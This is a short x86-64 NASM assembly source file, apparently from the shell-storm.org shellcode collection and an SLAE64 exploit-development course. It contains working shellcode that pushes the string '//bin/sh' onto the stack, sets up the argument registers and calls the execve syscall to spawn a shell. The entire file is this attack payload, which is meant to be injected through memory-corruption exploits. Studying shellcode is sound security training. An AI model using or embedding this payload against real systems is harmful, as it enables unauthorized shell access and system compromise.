; From: http://shell-storm.org/shellcode/files/shellcode-806.php
; Filename: shellcode2.nasm
; Author: SLAE64 - 1525
;
; Purpose: Execute /bin/sh
BITS 64
section .text
global _start

SYS_EXECVE equ 0x3b
SH equ 0x68732f6e69622f2f
 
_start:
    sub rax, rax
    mov rdx, rax
    push rax
    mov rbx, SH
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp

    push byte SYS_EXECVE
    pop rax

    syscall